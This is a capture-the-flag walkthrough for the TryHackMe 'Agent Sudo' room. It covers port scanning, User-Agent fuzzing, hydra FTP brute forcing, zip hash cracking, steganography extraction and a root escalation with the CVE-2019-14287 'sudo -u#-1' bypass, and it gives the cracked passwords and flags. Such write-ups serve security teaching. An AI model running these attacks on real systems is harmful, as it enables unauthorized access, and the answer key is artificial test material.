
## Task 1: Author note
> Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!


### Deploy the machine
### No answer needed

&nbsp;

## Task 2: Enumerate
### How many open ports?
- Let's run a simple `nmap` scan on the IP address.
```
$ nmap -sC -sV 10.10.80.123
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-13 13:14 IST
Nmap scan report for 10.10.80.123
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.64 seconds
```
- There are three open ports:

| Port | Service | 
|---------|------|
| 21 | ftp |
| 22 | ssh |
| 80 | http | 

### Answer
```
3
```

&nbsp;

### How you redirect yourself to a secret page?
- Let's visit the machine using the browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/8bc89493-ded5-439d-82ea-90bb56b2f855)


- We have to use modify our request. For that we have to intercept it using Burpsuite.

![3](https://github.com/Knign/Write-ups/assets/110326359/0ada2e34-3de8-4813-be4c-f7cd3591c4b2)

- Let's forward the request to the `Intruder`.

![4](https://github.com/Knign/Write-ups/assets/110326359/0ec38f2e-b61e-4681-b9ae-b00f1ed17c91)

- After setting the field on the `User-Agent`, we can move on to selecting the payloads.

![5](https://github.com/Knign/Write-ups/assets/110326359/940bd213-2336-48f8-a66c-713101d8fddc)

- We can set the Payload as a `Simple list` and use all the characters.
- Let's start the attack.

![6](https://github.com/Knign/Write-ups/assets/110326359/95231371-48be-43fa-a37f-12b71aff8e8f)


- We can see that the request where the `User-Agent: C` is being redirected to another page as shown by the `302` code.
### Answer
```
User-Agent
```

&nbsp;

### What is the agent name?
- Let's go to the `Options` tab and set the `Follow redirection` option to `Always`.

![13](https://github.com/Knign/Write-ups/assets/110326359/b6f2395d-6f52-4b31-a3df-e1d6dcfb1a81)

- Now, let's start the attack again and check `Response 2` to see if it has any useful information.

![7](https://github.com/Knign/Write-ups/assets/110326359/1e5b4aa5-f53b-4e9c-847f-a9bed92f0ea8)

- We are told the the user `chris` has a weak password.
- Knowing that FTP is running on the machine, this could be an opportunity for brute forcing.
### Answer
```
chris
```

&nbsp;

## Task 3 Hash cracking and brute-force
### FTP password
- Using `hydra`, we can brute force the password for the user `chris`.
```
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.80.123
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 13:41:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.80.123:21/
[21][ftp] host: 10.10.80.123   login: chris   password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 6 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 13:42:52
```
- Now we know that the password for user `chris` is `crystal`.
### Answer
```
crystal
```

&nbsp;

### Zip file password
- Let's login through FTP using those credentials.
```
$ ftp chris@10.10.80.123
Connected to 10.10.80.123.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
- Let's list out the contents.
```
ftp> ls
229 Entering Extended Passive Mode (|||36660|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
- We can now download all the file using the `get` command.
```
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||9210|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************************************************************************************************************************|   217       22.46 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (1.51 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||40007|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***********************************************************************************************************************************************************************************************| 33143      115.35 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (77.08 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||24980|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************************************************************| 34842      125.43 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (84.38 KiB/s)
```
- Now that all of those files are in our machine we can search for the ZIP file.
- Let's use `binwalk` on the `cutie.png`file to find more information.
```
$ binwalk cutie.png  

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
- We can see that there is Zip archive data in one of the files.
- Let's use `binwalk` to extract the ZIP file.
```
$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt
```
- Let's  go to the `_cutie.png.extracted` directory and take a look inside.
```
$ cd _cutie.png.extracted ; ls
365  365.zlib  8702.zip  To_agentR.txt
```
- We can use `7z` to unzip the file.
```
$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_IN,Utf16=on,HugeFiles=on,64 bits,3 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 17:59:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 17:59:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
```
- We don't know the password yet.
- In order to unzip the file, we will first need to find it's hash. We can do that using `zip2john`.
```
$ zip2john 8702.zip > zip_hash.txt
Created directory: /home/kunal/.john
```
- Let's now try to crack the password using `john` (John The Ripper).
```
$ john zip_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 3 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE 2/3 (2023-11-13 14:00) 0.6060g/s 26421p/s 26421c/s 26421C/s 123456..mobydick
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- So the password of the ZIP file is `alien`.
### Answer
```
alien
```

&nbsp;

### steg password
- We can now unzip the ZIP file.
```
$ 7z e 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_IN,Utf16=on,HugeFiles=on,64 bits,3 CPUs 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz (806C1),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 17:59:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 17:59:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```
- Let's `cat` the content of `To_agentR.txt`.
```
$ cat To_agentR.txt           
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
- The string `QXJlYTUx` looks to be Base64 encoded. 
- Let's try to decode it.
```
$ echo "QXJlYTUx" | base64 -d
Area51   
```
### Answer
```
Area51
```
### Who is the other agent (in full name)?
- Next we can extract information from the `cute-alien.jpg` file using `steghide`.
```
$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```
- Let's `cat` the contents of `message.txt`.
```
$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
- So we know that the user `james` has the password `hackerrules!`.
### Answer
```
james
```
### SSH password
### Answer
```
hackerrules!
```
## Task 4: Capture the user flag
### What is the user flag?
- Let's SSH into James' machine.
```
$ ssh james@10.10.80.123             
The authenticity of host '10.10.80.123 (10.10.80.123)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.123' (ED25519) to the list of known hosts.
james@10.10.80.123's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov 13 08:43:14 UTC 2023

  System load:  0.0               Processes:           93
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.80.123
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```
- Now we can look at the files in the machine.
```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```
- Let's `cat` the `user_flag.txt` file.
```
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```
### Answer
```
b03d975e8c92a7c04146cfa7a5a313c7
```

&nbsp;

### What is the incident of the photo called?
- For this we have to download the `Alien_autospy.jpg` image.
```
$ scp james@10.10.80.123:/home/james/Alien_autospy.jpg /home/kunal/tryhackme/agentsudo/.
james@10.10.80.123's password: 
Alien_autospy.jpg                                                                                                                                                                                         100%   41KB  40.7KB/s   00:01    
```
- We can now use TinEye to perform a reverse image search.

![8](https://github.com/Knign/Write-ups/assets/110326359/3822e3d4-24cd-4c41-b566-f00591aa01be)


- Let's upload the file.

![9](https://github.com/Knign/Write-ups/assets/110326359/4457134a-c94d-4639-9f12-0b53e6fe0b1d)


- Let's click on the top link.

![10](https://github.com/Knign/Write-ups/assets/110326359/5825d474-ab9a-4cc9-a596-ebeabd630a2c)


### Answer
```
Roswell alien autopsy
```

&nbsp;

## Task 5: Privilege escalation
### CVE number for the escalation
- Let's look at what binaries have the 
```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
- The users are not allowed to run `/bin/bash` as root.
- if we go to Exploit Database, we can find the CVE for this vulnerability.

![11](https://github.com/Knign/Write-ups/assets/110326359/e2554b6d-f078-4492-aa49-9213cbc9ddcc)


### Answer
```
CVE-2019-14287
```

&nbsp;

### What is the root flag?
- We can also find the exploit for this vulnerability on Exploit Database.

![12](https://github.com/Knign/Write-ups/assets/110326359/4267c425-95dd-4127-8b2f-922bcde624f6)


- Let's enter that in the terminal.
```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
```
- We have successfully escalated out privilege to root.
- Let's `cat` the root flag.
```
root@agent-sudo:/root# cd /root ; cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
### Answer
```
b53a02f55b57d4439e3341834d70c062
```

&nbsp;

### (Bonus) Who is Agent R?
- The message was from `Agent R` who is also known as `DesKel`.
### Answer
```
DesKel
```
